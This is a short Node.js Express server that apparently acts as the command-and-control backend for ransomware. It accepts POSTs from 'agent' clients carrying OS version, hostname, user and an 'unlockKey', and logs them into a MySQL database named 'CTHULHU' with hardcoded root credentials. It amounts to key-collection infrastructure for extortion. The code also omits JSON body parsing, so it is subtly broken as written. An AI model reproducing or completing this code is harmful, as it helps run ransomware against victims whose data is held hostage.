const express = require('express');
const mysql = require('mysql');

const app = express();
const port = 3000;

// Set up MySQL connection
// change the cread to your own
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'toor',
  database: 'CTHULHU'
});

// Connect to MySQL
db.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL database: ' + err.stack);
    return;
  }
  console.log('Connected to MySQL database as ID ' + db.threadId);
});

// API endpoint for receiving data
app.post('/api/data', (req, res) => {
  // Parse incoming request data as JSON
  const { versionOS, hosts, user, key } = req.body;

  // Insert data into MySQL
  const sql = `INSERT INTO agent (versionOS, hosts, user, unlockKey) VALUES (?, ?, ?, ?)`;
  const values = [versionOS, hosts, user, key];

  db.query(sql, values, (err, result) => {
    if (err) {
      console.error('Error inserting data into MySQL: ' + err.stack);
      res.status(500).send('Error inserting data into MySQL');
      return;
    }
    console.log('Inserted data into MySQL with ID ' + result.insertId);
    res.status(200).send({ id: result.insertId });
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});